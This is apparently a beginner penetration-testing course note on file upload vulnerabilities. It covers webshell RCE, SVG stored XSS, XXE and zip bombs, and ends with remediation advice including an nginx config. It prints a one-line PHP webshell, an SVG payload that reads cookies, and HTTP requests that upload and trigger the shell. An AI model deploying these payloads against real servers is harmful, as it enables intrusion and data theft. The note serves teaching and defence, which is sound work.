---
tags: [vapt, file-upload, beginner]
difficulty: beginner
module: "22 - File Upload"
topic: "22.01 What Makes File Upload Dangerous"
portswigger_labs: ["Remote code execution via web shell upload"]
---

# 22.01 — What Makes File Upload Dangerous

## What is it?
File upload functionality allows users to push their own data onto a web server. While essential for modern web applications (like uploading profile pictures, resumes, or product images), it represents a significant security risk if not strictly controlled.

When you allow a user to upload a file, you are allowing them to place potentially executable or dangerous content on your filesystem. If an attacker uploads a script (like a PHP or ASP file) and the server saves it into a directory where script execution is enabled (like the web root), the attacker can execute that script simply by navigating to its URL. This leads to complete Remote Code Execution (RCE). 

Beyond RCE, file uploads can be abused to trigger client-side attacks (Stored XSS via SVG or HTML files), server-side attacks (XXE or SSRF via XML processing), Denial of Service (Zip bombs), or to overwrite critical system configuration files.

## ASCII Diagram
```text
          [Attacker] 
               │
               │ 1. Malicious File (shell.php / evil.svg / bomb.zip)
               ▼
[Web Application (File Upload Endpoint)]
               │
               ├─► [Scenario A: Executable Upload]
               │      Server saves shell.php in web root.
               │      Attacker visits URL -> Remote Code Execution (RCE)
               │
               ├─► [Scenario B: Client-Side Attack]
               │      Server saves evil.svg containing <script>.
               │      Victim views SVG -> Stored XSS
               │
               ├─► [Scenario C: Server-Side Parsing]
               │      Server processes evil.docx for a preview.
               │      Parser reads XML payload -> XXE / SSRF
               │
               └─► [Scenario D: Denial of Service]
                      Server unzips a 1KB "zip bomb".
                      Unzips to 1TB -> Disk Space Exhaustion (DoS)
```

## How to Find It
- **Manual steps:**
  1. Map the application and identify every location where a user can supply a file. Common areas include user profiles (avatars), support tickets (attachments), HR portals (resumes), and CMS backends (media libraries).
  2. Don't forget indirect uploads, such as providing a URL for the server to fetch ("Import Image from URL").
  3. Note the accepted file types, file size limits, and the URL where the uploaded files are ultimately hosted or served back to the user.

- **Tool commands with flags explained:**
  To actively hunt for upload endpoints using a spidering tool:
  ```bash
  # Run a targeted spider to find endpoints that might accept POST forms
  gospider -s "https://target.com" -d 3 -a | grep -i "upload"
  ```

## How to Exploit It
- **Step-by-step walkthrough:**
  1. Determine the technology stack of the target server (e.g., PHP, .NET, Java).
  2. Select an appropriate malicious payload (e.g., a webshell for RCE, an SVG with JavaScript for XSS).
  3. Attempt to upload the file directly.
  4. If blocked, begin applying bypass techniques (Content-Type spoofing, Extension manipulation, Null Byte injection, Magic Bytes).
  5. Once uploaded, locate the file's final URL and trigger the payload.

- **Actual payloads:**
  **Webshell (PHP):**
  ```text
  filename: shell.php
  content: <?php system($_GET['cmd']); ?>
  ```
  **Stored XSS (SVG):**
  ```text
  filename: image.svg
  content: <svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie)"/>
  ```

- **Real HTTP request/response examples:**
  **Upload Request:**
  ```http
  POST /api/v1/profile/upload HTTP/1.1
  Host: target.com
  Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

  ------WebKitFormBoundary
  Content-Disposition: form-data; name="avatar"; filename="shell.php"
  Content-Type: application/x-php

  <?php system($_GET['cmd']); ?>
  ------WebKitFormBoundary--
  ```
  **Triggering the Exploit:**
  ```http
  GET /uploads/avatars/shell.php?cmd=id HTTP/1.1
  Host: target.com

  HTTP/1.1 200 OK
  uid=33(www-data) gid=33(www-data)
  ```

## Real-World Example
In many historical breaches of WordPress sites, attackers exploited poorly coded themes or plugins that featured unrestricted file upload endpoints. Attackers would upload a PHP backdoor (webshell) masquerading as an image or theme file. Because the `/wp-content/uploads/` directory often allowed PHP execution by default, the attacker could simply browse to their uploaded file to gain full control over the web server, allowing them to deface the site, steal the database, or pivot into the internal network.

## How to Fix It
- **Developer remediation:**
  Securing file uploads requires defense-in-depth:
  1. **Extension Allowlisting:** Explicitly define safe extensions (e.g., `.jpg`, `.png`). Never use a blocklist.
  2. **Content Validation:** Check file magic bytes and use processing libraries to strip metadata/malicious payloads (e.g., re-rendering images).
  3. **Randomized Filenames:** Discard user-provided filenames entirely; generate unique UUIDs.
  4. **Separate Storage:** Store uploads on a completely separate domain (e.g., an AWS S3 bucket or a subdomain like `cdn.target.com`) or outside the web root to prevent execution and cross-origin attacks.
  5. **Disable Execution:** If storing locally, configure the web server to forcefully disable script execution in the uploads directory.

- **Code snippet:**
  **Nginx Configuration (Disable Execution):**
  ```nginx
  location ^~ /uploads/ {
      # Do not process PHP files in this directory
      location ~ \.php$ {
          deny all;
      }
      # Force files to be served safely
      add_header X-Content-Type-Options nosniff;
      add_header Content-Disposition attachment;
  }
  ```

## Chaining Opportunities
- File Upload + [[10 - File Upload + XXE (malicious DOCX/XLSX)]] → If the upload endpoint accepts DOCX or XLSX files, an attacker can upload an XML External Entity payload to extract local files or scan the internal network during the document parsing phase.
- File Upload + [[07 - File Upload + Path Traversal]] → Attackers can append `../` to the upload filename, forcing the application to drop the malicious file outside the restricted `/uploads/` directory into an executable location like the web root.

## Related Notes
- [[02 - Unrestricted File Upload — Webshell Upload]]
- [[03 - Content-Type Bypass]]
- [[04 - Extension Bypass (.php5, .phtml, .phar, .shtml)]]
- [[15 - Defense — Extension Allowlists, Content Validation, Separate Storage]]
